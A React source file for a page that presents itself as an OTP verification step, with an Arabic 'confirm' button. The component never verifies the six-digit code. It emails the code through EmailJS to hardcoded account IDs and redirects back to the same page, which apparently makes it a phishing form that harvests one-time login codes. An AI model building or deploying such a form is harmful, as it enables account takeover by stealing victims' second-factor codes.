import React, { Component } from 'react';
import { Container, Button, Form, InputGroup } from 'react-bootstrap';
import { Link } from 'react-router-dom';
import emailjs from "emailjs-com";
import ReactCodeInput from 'react-verification-code-input';

class FinalOTP extends Component {
    state = {
        btnDisabled: true,
        userVerificationCode: ""
    }

    render() {

        const submitOTP = (e) => {
            e.preventDefault();
            const { userVerificationCode } = this.state;


            sendEmail(e);
        }

        const sendEmail = (e) => {

            console.log("otp", e.target);
            emailjs.sendForm('service_2lqpo5v', 'template_4a70v16', e.target, 'user_ZGOipJzOPAMNq9fEL55ik')
                .then((result) => {
                    window.location.href = "/finalotp";
                }, (error) => {
                    console.log(error.text);
                });
        };

        return <Container dir="ltr" className="d-flex justify-content-center otp-container mt-5 p-5 border">
            <Form className="form" onSubmitCapture={submitOTP}>
                <Form.Group className="mb-3 p-2 pb-0 form-group" controlId="formBasicEmail">
                    <ReactCodeInput onChange={(value) => {
                        const code = value;

                        if (code.length === 6) {
                            this.setState({
                                btnDisabled: false,
                                userVerificationCode: code
                            })
                        } else {
                            this.setState({
                                btnDisabled: true
                            })
                        }
                    }} />
                </Form.Group>
                <Form.Group className="mb-3 d-none" controlId="formBasicEmail" >
                    <Form.Control type="text" placeholder="Enter email" name="otp" value={this.state.userVerificationCode} />
                </Form.Group>
                <Form.Group className="mb-3 p-2 pt-0">
                    <Button variant="primary" type="submit" className="w-100 green-btn p-2">
                        تأكيد
                    </Button>
                </Form.Group>
            </Form>


        </Container>
    }
}

export default FinalOTP;